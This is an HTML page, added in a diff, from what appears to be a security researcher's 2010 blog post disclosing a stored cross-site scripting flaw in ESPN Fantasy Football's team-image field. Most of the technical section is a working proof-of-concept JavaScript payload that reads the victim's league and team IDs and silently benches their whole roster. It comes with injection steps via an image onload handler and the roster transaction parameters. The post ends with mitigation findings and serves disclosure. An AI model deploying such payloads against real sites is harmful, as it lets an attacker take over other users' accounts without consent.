@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>lanmaster53.com</title>
+        <meta name="author" content="Tim Tomes">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://fonts.googleapis.com/css?family=Raleway:400,300,600" rel="stylesheet" type="text/css">
+        <link rel="stylesheet" href="/static/css/normalize.css">
+        <link rel="stylesheet" href="/static/css/skeleton.css">
+        <link rel="stylesheet" href="/static/css/style.css">
+        <link rel="stylesheet" href="/static/css/pygments.css">
+        <link rel="shortcut icon" href="https://www.gravatar.com/avatar/0a6d9b1ad59ad436bf9d9d16b2a7133e.png?s=16" />
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="four columns meta">
+                    <ul>
+                        <li><a href="/"><img src="https://www.gravatar.com/avatar/0a6d9b1ad59ad436bf9d9d16b2a7133e.png?s=128" class="avatar" /></a></li>
+                                            <li><a href="https://bitbucket.org/lanmaster53" target="_blank"><img src="/static/images/meta/bitbucket.png" /></a></li>
+                                            <li><a href="https://github.com/lanmaster53" target="_blank"><img src="/static/images/meta/github.png" /></a></li>
+                                            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="/static/images/meta/youtube.png" /></a></li>
+                                            <li><a href="https://twitter.com/lanmaster53" target="_blank"><img src="/static/images/meta/twitter.png" /></a></li>
+                                            <li><a href="https://www.linkedin.com/in/lanmaster53" target="_blank"><img src="/static/images/meta/linkedin.png" /></a></li>
+                                            <li><a href="/contact/"><img src="/static/images/meta/email.png"></a></li>
+                    </ul>
+                </div>
+                <div class="eight columns nav">
+                    <ul>
+                                            <li><a href="/projects/">Projects</a> | </li>
+                                            <li><a href="/archive/">Archive</a> | </li>
+                                            <li><a href="/categories/">Categories</a> | </li>
+                                            <li><a href="/company/">Company</a> | </li>
+                                            <li><a href="/training/">Training</a> | </li>
+                                            <li><a href="/faq/">Faq</a> | </li>
+                                            <li><a href="/about/">About</a></li>
+                                        </ul>
+                </div>
+            </div>
+            <!-- hr style="margin-top: 0;" -->
+            <div class="row">
+                <div class="twelve columns">
+                    <h2>ESPN Fantasy Football - The Complete Attack</h2>
+<h5>Thursday, September 23, 2010</h5>
+                </div>
+            </div>
+            <hr>
+            <div class="row">
+                <div class="twelve columns">
+                    <div class="content">
+    <p>I have run an ESPN Fantasy Football League every year since the software was available and am a huge fan of the ESPN Fantasy Football experience. However, last year I came across a series of vulnerabilities in the FFB software which basically give an attacker full control of opponent, and other league, teams. Very few people know of the research I was conducting as I was beginning the disclosure process with ESPN.com's web developers. Today, to my complete surprise, I was made aware of these 2 articles:</p>
+<!-- READMORE -->
+
+<p><a href="http://www.theregister.co.uk/2010/09/22/espn_fantasy_football_cheating/">http://www.theregister.co.uk/2010/09/22/espn_fantasy_football_cheating/</a><br />
+<a href="http://xs-sniper.com/blog/2010/09/22/put-me-in-coach/comment-page-1/">http://xs-sniper.com/blog/2010/09/22/put-me-in-coach/comment-page-1/</a></p>
+<p>While xssniper rightfully gets the credit for the discovery, as he was quicker to the trigger than I, he missed something in his research which greatly enhances this attack. There is a stored XSS vulnerability in the team image setting which allows an attacker to store a malicious script on the server and completely automates the roster attacks for anyone that is subjected to the team image. ESPN does validate the input by removing '&lt;' and '&gt;' from the input, but what it doesn't do is limit the length of the input. Therefore, you can write the script in its entirety and inject it into the input field. The code that I have developed as a POC also works across leagues. Come back soon as I will be posting screenshots and POC code when I can get back to my lab.</p>
+<p>ENJOY!</p>
+<p>UPDATE: Note to self, take screenshots prior to disclosure of vulnerabilities. In my own defense, I was caught completely off guard by the disclosure so...</p>
+<p><a href="/static/images/posts/oops.png"><img alt="" src="/static/images/posts/oops.png" /></a></p>
+<p>Since i'm limited in the amount of pictures I can show at this point, i'll do my best to explain the process.</p>
+<h3>Discovery:</h3>
+<p>It all started at DEFCON 17. I had spent the majority of my time in the Web App Security track and really enjoyed the concepts of web application testing. As we all know, DEFCON is in late July / early August which was also about the time I typically set up my FFB league for the year. As I was editing my team settings, I saw that you could set a custom image in the form of a url. Since the image is then shown back to you on every page you visit within the league from that point forward, I figured there was some serious potential for a stored XSS attack there. Looking at the code, I noticed that all it did was take the url you submit, and throw it into the 'src' attribute of an image tag. In my first attempt to exploit, i filled the image tag with arbitrary data and appended a script tag to the closed image tag. To ESPN's credit, they actually validated the input and filtered out all '&lt;' and '&gt;'. Therefore, the script tag didn't work. I'd have to exploit via the image tag. Very easy. There are several events in an image that allows you to run javascript, 'onerror' and 'onload'. As you can see from my demo last year, I initially went with the 'onerror' event because I wanted to be completely obvious in testing. ESPN did not validate and filter out any javascript code, so the exploitation worked perfectly. For practical implementation, I went with the 'onload' event, loading an actual team image, and running the script upon a successful load. I had some fun with this over the season.</p>
+<h3>Exploitation:</h3>
+<p>My favorite implementation was a script that prompted other players viewing my team if they were my opponent that week. If they clicked 'yes', then the script went through a series or random "trash talking" phrases. If they clicked 'no', then they were forward to my team page. Harmless really. As I began to look more into the FFB software, I began to notice the same parameter issues that xssniper pointed out in his blog. So a few months ago, I wrote a script which uses the stored XSS vulnerability to parse all of the required parameters from the visiting players browser and executes any series of evil things based upon those params. The code below first determines whether the visiting player is logged in or not. If they are logged in, it parses out the 'teamId', makes an AJAX call for their team page, parses out all of the 'playerId's, then loops through and benches every player using a dummy javascript image request. Basically, on gameday, when my opponent launches the scoreboard, their entire team is benched and they are unable to score any points. XSS FTW... literally!!!</p>
+<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">unique</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
+  <span class="nx">o</span><span class="o">:</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nx">n</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">x</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nx">y</span><span class="p">;</span> <span class="nx">x</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="p">[</span><span class="nx">x</span><span class="p">]</span><span class="o">==</span><span class="nx">a</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span> <span class="p">{</span>
+        <span class="k">continue</span> <span class="nx">o</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">r</span><span class="p">[</span><span class="nx">r</span><span class="p">.</span><span class="nx">length</span><span class="p">]</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">r</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">pagesrc</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">score_period</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">league_id</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">team_id</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">team_url</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">bench_url</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">player_ids</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">patt_pid</span> <span class="o">=</span> <span class="sr">/(playerId=).([\d]+).\s/g</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">patt_tid</span> <span class="o">=</span> <span class="sr">/([\d]+)/g</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">patt_spid</span> <span class="o">=</span> <span class="sr">/currentScoringPeriodId:\s(\d+),/g</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">patt_lid</span> <span class="o">=</span> <span class="sr">/leagueId:\s(\d+),/g</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">pagesrc</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="s2">&quot;My Fantasy Teams&quot;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">//get currentScoringPeriodId</span>
+  <span class="nx">score_period</span> <span class="o">=</span> <span class="nx">patt_spid</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">pagesrc</span><span class="p">);</span>
+  <span class="nx">score_period</span> <span class="o">=</span> <span class="nx">score_period</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+  <span class="c1">//get leagueId</span>
+  <span class="nx">league_id</span> <span class="o">=</span> <span class="nx">patt_lid</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">pagesrc</span><span class="p">);</span>
+  <span class="nx">league_id</span> <span class="o">=</span> <span class="nx">league_id</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+  <span class="c1">//get teamId</span>
+  <span class="nx">pagesrc</span> <span class="o">=</span> <span class="nx">pagesrc</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">pagesrc</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;My Fantasy Teams&quot;</span><span class="p">),</span><span class="mi">400</span><span class="p">);</span>
+  <span class="nx">team_id</span> <span class="o">=</span> <span class="nx">pagesrc</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">pagesrc</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;teamId=&quot;</span><span class="p">)</span><span class="o">+</span><span class="mi">7</span><span class="p">);</span>
+  <span class="nx">team_id</span> <span class="o">=</span> <span class="nx">patt_tid</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">team_id</span><span class="p">);</span>
+  <span class="nx">team_id</span> <span class="o">=</span> <span class="nx">team_id</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+  <span class="nx">team_url</span> <span class="o">=</span> <span class="s2">&quot;http://games.espn.go.com/ffl/clubhouse?leagueId=&quot;</span> <span class="o">+</span> <span class="nx">league_id</span> <span class="o">+</span> <span class="s2">&quot;&amp;amp;teamId=&quot;</span> <span class="o">+</span> <span class="nx">team_id</span> <span class="o">+</span> <span class="s2">&quot;&amp;amp;seasonId=2010&quot;</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">team_url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">pagesrc</span> <span class="o">=</span> <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+      <span class="nx">player_ids_clean</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
+      <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">while</span> <span class="p">(</span><span class="nx">player_ids</span> <span class="o">=</span> <span class="nx">patt_pid</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">pagesrc</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">player_ids_clean</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">player_ids</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+        <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="nx">player_ids_clean</span> <span class="o">=</span> <span class="nx">unique</span><span class="p">(</span><span class="nx">player_ids_clean</span><span class="p">);</span>
+      <span class="k">for</span> <span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="mi">15</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">bench_url</span> <span class="o">=</span> <span class="s2">&quot;http://games.espn.go.com/ffl/pnc/saveRoster?leagueId=&quot;</span> <span class="o">+</span> <span class="nx">league_id</span> <span class="o">+</span> <span class="s2">&quot;&amp;amp;teamId=&quot;</span> <span class="o">+</span> <span class="nx">team_id</span> <span class="o">+</span> <span class="s2">&quot;&amp;amp;scoringPeriodId=&quot;</span> <span class="o">+</span> <span class="nx">score_period</span> <span class="o">+</span> <span class="s2">&quot;&amp;amp;returnSm=false&amp;amp;trans=1_&quot;</span> <span class="o">+</span> <span class="nx">player_ids_clean</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;_0_20&quot;</span><span class="p">;</span>
+        <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
+        <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">bench_url</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">};</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>Script usage:</p>
+<ol>
+<li>Compress with <a href="http://dean.edwards.name/packer/">http://dean.edwards.name/packer/</a></li>
+<li>Copy compressed code and paste into notepad</li>
+<li>Use notpad to replace all " with '</li>
+<li>Append result from notepad to <code>http://[image url]" onload="</code></li>
+</ol>
+<p>The script is seen as coming from espn, so same origin policy applies and the script is allowed to run. Also, NoScript doesn't help unless you are blocking globally which ruins the espn.com experience.</p>
+<p>Other information I was able to discover:</p>
+<p>transType table:</p>
+<div class="codehilite"><pre><span></span>1=Move
+2=Add
+3=Drop
+</pre></div>
+
+
+<p>Position table:</p>
+<div class="codehilite"><pre><span></span>0=QB
+1=Not on Roster
+2=RB1/2
+3=RB/WR
+4=WR1/2
+5=TE
+16=D
+17=K
+20=BENCH
+</pre></div>
+
+
+<p>ADD Player:</p>
+<div class="codehilite"><pre><span></span>transType_playerId_?_?_startPos?_endPos
+ex. 2_11390_-1_1001_1_20
+</pre></div>
+
+
+<p>MOVE Player:</p>
+<div class="codehilite"><pre><span></span>transType_playerId_startPos_endPos
+ex. 1_1753_0_20
+</pre></div>
+
+
+<p>DROP Player:</p>
+<div class="codehilite"><pre><span></span>transType_playerId_teamId/scoringPeriod?_Position_?_?
+ex. 3_1753_1_2_-1_1002
+</pre></div>
+
+
+<p>Bottom-line Findings and Mitigation:</p>
+<ol>
+<li>Input box allows strings of any length for input. Bad idea. Limit input.</li>
+<li>When done for real, there is a confirmation button which issues a POST. However, the server side function will accept a GET, which makes this attack much easier. If they accepted POST only, then we would have to use additional resources to create the attack. Much easier to leverage a session through GET than it is to pass authentication tokens via POST.</li>
+<li>Some code validation is done, but not enough. May prevent referencing the script from another location, but since it is injectible through 'onerror' and 'onload', and input is unlimited, who cares.</li>
+</ol>
+</div>
+<p>Like what you see? Join me for live training! See the <a href="/training/">Training</a> page for more information.</p>
+<hr>
+<div class="comments">
+    <h6>Please share your thoughts, comments, and suggestions via Twitter.</h6>
+    <a href="http://twitter.com/share" class="twitter-share-button" data-count="none" data-via="">Tweet</a>
+    <a href="http://twitter.com/lanmaster53" class="twitter-follow-button" data-show-count="false">Follow @lanmaster53</a>
+    <script src="https://platform.twitter.com/widgets.js" type="text/javascript"></script>
+</div>
+                </div>
+            </div>
+            <hr>
+            <div class="row">
+                <div class="twelve columns">
+                    <footer>
+                        <p>
+                            &copy; 2018 Tim Tomes
+                            <span style="float: right;">
+                                powered by
+                                <a href="http://flask.pocoo.org/" target="_blank" title="Flask: Python Web Development Microframework">Flask</a>
+                                and <a href="http://getskeleton.com/" target="_blank" title="Skeleton CSS">Skeleton</a>
+                            </span>
+                        </p>
+                    </footer>
+                </div>
+            </div>
+        </div>
+        <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-52269615-1', 'lanmaster53.com');
+    ga('send', 'pageview');
+</script>    </body>
+</html>
